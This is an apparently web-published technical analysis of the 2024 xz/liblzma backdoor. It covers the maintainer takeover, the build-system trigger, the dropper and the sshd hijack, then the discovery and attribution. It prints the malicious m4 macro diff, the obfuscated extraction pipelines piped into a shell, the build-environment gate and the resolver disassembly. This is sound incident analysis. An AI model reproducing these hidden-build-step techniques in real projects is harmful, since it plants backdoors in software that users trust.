On March 29, 2024 at 15:51 UTC, Andres Freund posted to *oss-security*. Subject: *backdoor in upstream xz/liblzma leading to ssh server compromise*. Within hours, Debian rolled sid back to a pre-5.6 xz, Red Hat pulled Fedora 40 Beta and Rawhide, GitHub disabled the upstream `tukaani-project` organization, and CVE-2024-3094 took the maximum CVSS score of 10.0.

What had almost shipped — to Debian, Fedora, Kali, openSUSE — was a pre-authentication remote-code-execution backdoor in `sshd` (the SSH server daemon, listening on port 22 of nearly every Linux machine on the public internet), hidden inside `liblzma` (the compression library xz Utils ships). Upstream OpenSSH doesn't depend on `liblzma` and `liblzma` doesn't depend on OpenSSH; the attack threaded that gap with two years of accumulated maintainer trust, a shell snippet wedged into an autoconf macro, and an IFUNC resolver that fired before the dynamic linker locked the GOT.

Five acts: the takeover, the trigger, the dropper, the runtime hijack, the discovery.

## Act I — Arrival

The technical mechanism is exotic. The story that put it in place is mundane: one tired maintainer, a polite contributor who slowly took over, and a sock-puppet pressure campaign about the pace of work. Once the contributor had commit access, the takeover continued in places code review doesn't watch — replacing the maintainer's email on Google's [oss-fuzz](https://github.com/google/oss-fuzz/pull/9960) (the open-source fuzzing service that flags bugs to upstream maintainers) so vulnerability reports routed to him, [breaking the Landlock sandbox check](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=328c52da8a2bbb81307644efdb58db2c422d9ba7) in CMakeLists, [disabling IFUNC fuzzing](https://github.com/google/oss-fuzz/pull/10667), and four days before discovery rewriting `SECURITY.md` to prefer private email disclosures over public GitHub advisories. Every audit tool assumes the maintainer is honest; once that assumption broke, nothing downstream could catch the rest. Russ Cox's [xz-timeline](https://research.swtch.com/xz-timeline) is the canonical reference.

<Timeline client:visible />

By February 2024, the social-engineering work is done: Jia Tan is co-maintainer, signs releases, owns the security inbox. None of it required shipping hostile code yet. That happens next, in a place no one was looking.

## Act II — The Trigger

Two artifacts ship with an xz release: the *git tag* (the source committed to the repository) and the *release tarball* (the same source plus the output of *autoconf* — a build-system generator that produces `configure` scripts from `m4` macros, the templating language autoconf uses). The second one is rarely audited closely: it's machine-generated, sometimes from a different machine, sometimes by a bot. xz-5.6.1's tarball contained an `m4/build-to-host.m4` that did not exist in git and did not match the gnulib (GNU's macro library) version it claimed to be.

<TarballDiff />

The file is named after a stock gnulib macro, but the content diverges from the upstream [gnulib version](https://git.savannah.gnu.org/gitweb/?p=gnulib.git;a=blob_plain;f=m4/build-to-host.m4) it claims to be. Three additions carry the entire trigger (cosmetic and trailing-convenience-block changes elided):

```diff title="m4/build-to-host.m4 — upstream gnulib  vs  xz-5.6.1.tar.gz" frame="code"
 # build-to-host.m4
 dnl Written by Bruno Haible.

 AC_DEFUN([gl_BUILD_TO_HOST],
 [
   ...
   gl_final_[$1]="$[$1]"
+  gl_[$1]_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"`
   ...
+  if test "x$gl_am_configmake" != "x"; then
+    gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'
+  fi
+  AC_CONFIG_COMMANDS([build-to-host],
+    [eval $gl_config_gt | $SHELL 2>/dev/null],
+    [gl_config_gt="eval \$gl_[$1]_config"])
 ])

 AC_DEFUN([gl_BUILD_TO_HOST_INIT],
 [
+  gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2>/dev/null`
   gl_sed_double_backslashes='s/\\/\\\\/g'
   gl_sed_escape_doublequotes='s/"/\\"/g'
+  gl_path_map='tr "\t \-_" " \t_\-"'
 ])
```

In `gl_BUILD_TO_HOST_INIT`, `gl_am_configmake` searches the source tree for files containing `####XXXXX####$` markers — bytes crafted into `bad-3-corrupt_lzma2.xz`. `gl_path_map` is the `tr` swap that reverses the file's deliberate corruption. In `gl_BUILD_TO_HOST`, `gl_[$1]_config` stitches them into a pipeline: `sed` reads the marker file, `eval $gl_path_map` undoes the corruption, and `$gl_[$1]_prefix -d` decompresses (the prefix is `xz`, derived from the file extension).

`AC_CONFIG_COMMANDS` is the pivot: it tells autoconf to run `eval $gl_config_gt | $SHELL` after `configure` finishes. The pipeline output — Stage-1 — feeds straight into a fresh shell. All of this lives only in the tarball, never in git, riding the gap between source-of-truth (the repository, where every commit is reviewed) and what-actually-builds (the tarball, which most security tooling doesn't follow).

## Act III — The Payload

The dropper has three properties to satisfy: each layer must look innocuous in isolation, the final binary must never exist at rest in any repository or tarball, and the chain must fail silently outside real package builds. Those three constraints shape every byte. What ships in the tarball is the m4 diff above plus two binary "test fixtures" — `bad-3-corrupt_lzma2.xz` (512 B, sha-256 `ecda10d8…16bd`) and `good-large_compressed.lzma` (35 KB, sha-256 `9aef8982…7032`). Together they unfold into a Linux ELF object — `liblzma_la-crc64-fast.o`, the on-disk format Linux uses for executables and shared libraries. The walk below cross-references [Russ Cox's xz-script analysis](https://research.swtch.com/xz-script).

### Stage 1 — the macro fires

On `./configure`, autoconf evaluates the modified macro into a shell pipeline. After substitution, that pipeline runs against the test fixture:

```bash title="effective pipeline (after autoconf evaluates the macro)" frame="code"
tr "\t \-_" " \t_\-" < bad-3-corrupt_lzma2.xz | xz -d
```

`bad-3-corrupt_lzma2.xz` is a deliberately malformed xz stream. The `tr` swap (tab↔space, `-`↔`_`) reverses the corruption; `xz -d` then decompresses cleanly into a 1.3 KB shell script — Stage-1.

### Stage 2 — the chunker

Stage-1 doesn't run anything dangerous yet. Its job is to extract the next layer from the *other* fixture, `good-large_compressed.lzma`:

```bash title="Stage-1.sh — extracting the payload from good-large_compressed.lzma" frame="code"
xz -dc good-large_compressed.lzma \
  | <head-chunker> \
  | tail -c +31233 \
  | tr "\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377" \
  | xz -F raw --lzma1 -dc \
  | /bin/sh
```

The `<head-chunker>` is 16 repetitions of `(head -c +1024 >/dev/null) && head -c +2048`, then one `(head -c +1024 >/dev/null) && head -c +939`. In effect: skip 1024, take 2048; … sixteen times; skip 1024, take 939 — outputting 33,707 bytes from the file's middle. `tail -c +31233` keeps the last 2,475.

Those 2,475 bytes are not yet a valid lzma stream. The `tr` table that follows is a byte permutation — every one of the 256 possible byte values is mapped to a different byte. Applied to the 2,475 bytes, it reshuffles them into a valid raw-lzma1 frame. Decompressed, that frame is the Stage-2 shell script.

The 5.6.0 dropper uses different magic numbers (`tail -c +31265`, `head -c +724`, a different `tr` table) — same shape, version-specific constants.

### Stage 3 — the .o lands

Stage-2 gates aggressively before doing anything dangerous. Each check below is "if this looks wrong, exit silently — no error, no message, no trace":

```bash title="Stage-2.sh — the build-environment gate (condensed)" frame="code"
[ "$(uname)" != "Linux" ]                                  && exit 0   # not Linux
echo "$build" | grep -Eq "^x86_64.*linux-gnu$"             || exit 0   # not x86_64 Linux ABI
[ "$CC" = "gcc" ] && [ "$GCC" = "yes" ]                    || exit 0   # not gcc
$LD -v 2>&1 | grep -q "GNU ld"                             || exit 0   # not GNU ld
[ "$enable_shared" = "yes" ]                               || exit 0   # not building a shared library
test -f "$srcdir/debian/rules" || [ "$RPM_ARCH" = "x86_64" ] || exit 0  # not a Debian or x86_64 RPM build
grep -q 'HAVE_FUNC_ATTRIBUTE_IFUNC 1' config.h             || exit 0   # IFUNC support not detected
```

The dropper fires only inside a real x86_64 Linux distro packaging job. Anything else — CI sandboxes running `./configure` for static analysis, fuzzers, build environments outside Debian or RPM packaging — exits silently with no output and no trace. Documented in [Sam James's canonical FAQ](https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27).

On a successful gate, the script patches libtool to drop the `-fPIC -DPIC` constraint, re-runs the chunker against `good-large_compressed.lzma` with different offsets to extract the actual ELF, and writes it as `liblzma_la-crc64-fast.o` in the build tree. The configure machinery treats it as a normal CRC64 implementation. Linked into `liblzma.so.5`, it ships with the next package upgrade.

### What landed

The .o is small — 86.6 KB — but reports 242 ELF section headers (`e_shnum` at file offset `0x3C` reads `F2 00`); `objdump` filters that down to about a hundred named or loadable sections. The interesting ones, by [smx-smx/xzre](https://github.com/smx-smx/xzre)'s reverse-engineering: `_get_cpuid` (the IFUNC entry), `_cpuid` (a CPUID-feature helper), and an opaque blob `.Lx86_code.part.0` (~2.7 KB) that holds the runtime payload.

By the time the .o is linked into `liblzma.so.5`, the dropper has done its job: hostile code is now part of a signed, hash-verified, reproducibly-built Debian or Fedora package. Every distro security check passes — because each one verifies the binary *as it is*, and the binary is the malicious one.

## Act IV — The Hijack

Three Linux primitives carry the runtime hijack:

- **IFUNC** — *indirect functions*: a way for a library to choose the right implementation of a function at startup (e.g., a fast SSE4.2 path on capable CPUs, or a fallback elsewhere).
- **GOT** — *Global Offset Table*: a small in-memory table the dynamic linker fills with function addresses, so the program can call functions in shared libraries.
- **RELRO** — *RELocation Read-Only*: the protection that locks the GOT read-only after startup, so nothing can rewrite those addresses while the program is running.

Plus a downstream patch to OpenSSH that brings `liblzma` into `sshd`'s address space in the first place.

### The path

Upstream OpenSSH doesn't link `libsystemd`. Most systemd distributions patch sshd to call `sd_notify()` so the service manager knows when sshd is ready; that patch pulls `libsystemd.so.0` into the process, which in turn pulls `liblzma.so.5` for journal compression. `ldd` makes the chain explicit:

```bash title="ldd /usr/sbin/sshd  ·  Debian sid (excerpt)" frame="code"
linux-vdso.so.1 (0x00007ffd…)
libcrypto.so.3      => /lib/x86_64-linux-gnu/libcrypto.so.3
libsystemd.so.0     => /lib/x86_64-linux-gnu/libsystemd.so.0   # via downstream sd_notify patch
libz.so.1           => /lib/x86_64-linux-gnu/libz.so.1
libpam.so.0         => /lib/x86_64-linux-gnu/libpam.so.0
…
liblzma.so.5        => /lib/x86_64-linux-gnu/liblzma.so.5      # transitive — pulled by libsystemd
```

That chain is the entire setup. Every dynamically-loaded library shares its host's virtual address space — there is no privilege boundary between sshd and any library `ld.so` resolves into it. Once `liblzma.so.5` is mapped, its code can read or write any memory in sshd: GOT entries, function pointers, keys in flight. And the host is the keys to the kingdom — sshd runs as root and gates authentication, so code execution inside the process is remote root on every server that runs it. The path through `libsystemd` is an audit blind spot: OpenSSH upstream is among the most-reviewed codebases on Linux, but its maintainers don't audit transitive dependencies pulled in by downstream packaging patches.

All of this fires *before any client connects*. The IFUNC resolvers in `liblzma` run during `ld.so` setup, while sshd is starting — not when a connection arrives. By the time a packet hits the port, the GOT has already been rewritten.

### IFUNC, before RELRO

When the linker resolves an [IFUNC](https://gcc.gnu.org/onlinedocs/gcc/Common-Function-Attributes.html#index-ifunc-function-attribute) symbol — a symbol marked by GCC's `__attribute__((ifunc("...")))` — it invokes a *resolver* function during process startup and uses whatever pointer that resolver returns as the symbol's implementation. The intent is benign: a single CRC64 export can pick the SSE4.2 path on capable machines, or a table-lookup fallback elsewhere. The mechanism runs early in `ld.so` (the dynamic linker) setup — and crucially, *before* [RELRO](https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro) makes the GOT read-only.

That window is the entire attack. Inside the resolver, the [GOT](https://www.airs.com/blog/archives/41) is still writable, and the resolver can write anything anywhere in the process — including overwriting other GOT entries that have nothing to do with it.

### The resolver

`_get_cpuid` is the malicious .o's IFUNC entry. Declared job: fill a CPUID-features struct. Actual job: install hooks. AT&T disassembly:

```asm title="liblzma_la-crc64-fast.o · _get_cpuid (AT&T)" frame="code"
0000000000000000 <_get_cpuid>:
       0: f3 0f 1e fa                   endbr64
       4: 55                            pushq   %rbp
       5: 48 89 f5                      movq    %rsi, %rbp
       8: 4c 89 ce                      movq    %r9, %rsi
       b: 53                            pushq   %rbx
       c: 89 fb                         movl    %edi, %ebx
       e: 81 e7 00 00 00 80             andl    $0x80000000, %edi
      14: 48 83 ec 28                   subq    $0x28, %rsp
      18: 48 89 54 24 18                movq    %rdx, 0x18(%rsp)
      1d: 48 89 4c 24 10                movq    %rcx, 0x10(%rsp)
      22: 4c 89 44 24 08                movq    %r8, 0x8(%rsp)
      27: e8 00 00 00 00                callq   0x2c <_get_cpuid+0x2c>
      2c: 85 c0                         testl   %eax, %eax
      2e: 74 27                         je      0x57 <_get_cpuid+0x57>
```

The function preserves the calling convention so it really *does* return CPUID data when glibc's IFUNC machinery invokes it. The hostile work runs in the side effects of the first <Mnemonic op="callq">callq</Mnemonic> at offset `0x27`, which lands inside the opaque blob `.Lx86_code.part.0` (~2.7 KB on disk) and never returns directly into normal CRC64 logic.

### The hook

On-disk symbols are deliberately scrambled — runtime names like `_resolve` and `RSA_public_decrypt` only exist after the IFUNC installs its hooks. [smx-smx/xzre](https://github.com/smx-smx/xzre) documents what the blob does. At startup, the payload walks the linker's [`_r_debug`](https://refspecs.linuxbase.org/LSB_3.1.1/IA64/spec/r-debug.html) list to find `sshd`'s mapped range, resolves its GOT entry for [`RSA_public_decrypt`](https://docs.openssl.org/3.0/man3/RSA_public_encrypt/), and — because RELRO hasn't fired yet — uses a single <Mnemonic op="movq">movq</Mnemonic> to redirect that entry to a malicious stub.

When a client then attempts certificate-based auth, sshd calls `RSA_public_decrypt` — and the redirected call lands in the stub instead of in libcrypto. End-to-end, in plain sequence:

### The gate

The signature scheme is Ed448, not Ed25519 (Ed448 is a digital-signature algorithm — like RSA, but using elliptic curves with 448-bit keys). [amlweems/xzbot](https://github.com/amlweems/xzbot) confirmed it with a working proof-of-concept, extracting the attacker's embedded Ed448 public key and shipping a honeypot patch for OpenSSH. Without the matching private key, even a connection that knows the modulus layout produces no system call. The signature gate keeps blast radius to whoever holds the private key, and stops opportunistic abuse the moment the binary ships.

And yet, between publication and the key being used, the binary itself gave the game away — not through cryptanalysis, but through a 500-millisecond latency anomaly on ssh logins.

## Act V — The Discovery

In Andres Freund's own words: *"a few odd symptoms around liblzma … on Debian sid installations over the last weeks (logins with ssh taking a lot of CPU, valgrind errors)."* He measured it directly — a clean `sshd -h` took `0m0.299s`; the same call against a backdoored `liblzma` took `0m0.807s`.

He chased it with the tools he names in the disclosure: `valgrind` (a memory-error detector) for the bad reads and writes; then `perf record -e intel_pt//ub` (Intel Processor Trace, which records every instruction the CPU executes) to find where the slow run diverged from a clean baseline; then `gdb` (the GNU debugger) with breakpoints just before that divergence. Once execution led into liblzma's CRC64 path — which sshd has no upstream reason to call — the rest fell into place. He recognized the `RSA_public_decrypt` hook for what it was.

At 15:51 UTC on March 29, 2024, he posted to *oss-security*:

> After observing a few odd symptoms around liblzma (part of the xz package) on Debian sid installations over the last weeks (logins with ssh taking a lot of CPU, valgrind errors) I figured out the answer: The upstream xz repository and the xz tarballs have been backdoored. — Andres Freund, [oss-security 2024/03/29/4 ↗](https://www.openwall.com/lists/oss-security/2024/03/29/4)

## Aftermath

Within seven days of Andres's email, every affected distribution shipped a rollback: Debian rolled sid back to a pre-5.6 xz; Red Hat pulled Fedora 40 Beta and Rawhide; openSUSE, Arch, and Kali pulled or downgraded; Homebrew downgraded xz on macOS as a precaution. GitHub disabled the `tukaani-project` organization for several days, then re-enabled it under Lasse Collin's sole control. Lasse published a maintainer's statement at [tukaani.org/xz-backdoor](https://tukaani.org/xz-backdoor/).

<DistroGrid />

The vulnerable releases reached rolling and pre-release distributions only. Stable lines — Debian stable, Ubuntu LTS, RHEL, Amazon Linux — were still on pre-5.6 versions and were never exposed.

### What this attack proved

1. **Pre-RELRO IFUNC resolution is a writable-GOT window.** Any shared library loaded into `sshd`'s address space — even through an indirect chain like `sshd → libsystemd → liblzma` — can rewrite `sshd`'s function pointers from its own startup code, before `ld.so` marks the GOT read-only.
2. **A single-maintainer open-source project is a trust graph that can be slowly taken over.** Two years of polite contributions, sock-puppet pressure, and patient role accumulation got hostile bytes into a place every Linux server pulls from.
3. **A 500 ms latency anomaly was the only signal that fired.** No fuzzer, no SBOM check, no reproducible-build audit caught it. A developer noticed `sshd` was slow, and chased it.

## Attribution — who was Jia Tan?

What we know is what Jia Tan *did*. Who Jia Tan *was* — real name, real affiliation, real geography — is not public, and may never be. The most rigorous open analysis to date is by Rhea Karty (Dartmouth) and Simon Henniger (TU Munich), [published April 2024](https://rheaeve.substack.com/p/xz-backdoor-times-damned-times-and). What follows is theirs.

### Timezone — claimed vs actual

Almost every Jia Tan commit is timestamped **UTC+8** — Chinese Standard Time. A handful are stamped **UTC+2** or **UTC+3** — Eastern European Time and its summer variant. Forgetting to set a fake timezone before commit is a one-way error: someone really in UTC+8 will not accidentally produce UTC+3 timestamps. Someone in EET who forgot to fake the timezone will.

### Chinese holidays

If Jia Tan were actually in mainland China, two periods in 2023 should show activity gaps: the **Lunar New Year** (January 22–27) and the **Mid-Autumn Festival** (September 29). Neither does. Jia Tan committed normally through both. Specific examples, verifiable on GitHub:

- **2023-01-24, 12:48 UTC** — *liblzma: Fix documentation in filter.h for lzma_str_to_filters()* — [`f35d98e2`](https://github.com/tukaani-project/xz/commit/f35d98e20609e0be6a04ae2604bfb7cb9d5bd5e4)
- **2023-01-27, 12:14 UTC** — *Translations: Add Brazilian Portuguese translation of man pages* — [`3b1c8ac8`](https://github.com/tukaani-project/xz/commit/3b1c8ac8d1d553cbb1fb22b545d2b1424c752b76)
- **2023-09-29, 11:58 UTC** — *CMake: Specify LINKER_LANGUAGE for libgnu target* — [`506d0312`](https://github.com/tukaani-project/xz/commit/506d03127a8565442b028ec991e1578124fd3025)
- **2023-09-29, 14:11 UTC** — *CI: Disable CLANG64 MSYS2 environment until bug is resolved* — [`01e34aa1`](https://github.com/tukaani-project/xz/commit/01e34aa1171b04f8b28960b1cc6135a903e0c13d)

Three commits on the Mid-Autumn Festival itself; routine maintenance work spread across the Lunar New Year week. Not the cadence of someone observing the holidays.

### Sock-puppet coordination

The pressure emails came from accounts — *Jigar Kumar*, *Dennis Ens* — with zero public footprint anywhere else on the internet. Their timing aligned exactly with what Jia Tan needed at each step. One operator at two terminals, or two coordinated operators? The public record can't say. Almost certainly the same operation.

### What we don't know

Patience (≥2 years), budget to keep an identity active that long, and the sophistication of the runtime payload all point to a state-aligned actor — not a freelancer, not a criminal group. Public attribution remains speculative: no government has named a suspect; no suspect has been arrested. Treat any specific naming you see online as unverified.
